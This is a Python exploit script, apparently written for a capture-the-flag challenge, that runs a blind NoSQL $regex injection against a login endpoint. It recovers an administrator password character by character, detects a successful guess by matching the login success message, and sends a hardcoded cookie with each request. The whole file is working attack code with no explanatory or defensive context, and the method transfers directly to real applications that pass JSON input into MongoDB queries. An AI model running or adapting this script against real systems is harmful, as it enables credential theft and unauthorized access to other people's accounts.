#!/usr/bin/env python

from requests import Session
import time


password = ""
flag = "Welcome back Administrator!"
req = Session()
req.headers.update({"Content-Type": "application/json;charset=utf-8"})
req.headers.update({"Accept": "application/json, text/plain, */*"})
req.headers.update({"Cookie": "__cfduid=dd04757c87090d2baabf7fa0374e686c61471162352"})
offset = 54
for i in range(55):
    char = 32
    for d in range(32, 127):
        time.sleep(0.05)
        if char == 41:
            char += 6
        if char == 58:
            char += 6
        if char == 91:
            char = 95
        if char == 124:
            char += 1
        if char > 126:
            password += chr(46)
            offset -= 1
            break
        data = {"user": "admin", 'pass': {"$regex": "%s.{%s}" % (password + chr(char), offset)}}
        resp = req.post("http://chainedin.vuln.icec.tf/login", json=data)
        if flag in resp.content:
            print(chr(char))
            password += chr(char)
            offset -= 1
            if offset < 0:
                break
            break
        else:
            char += 1
print(password)
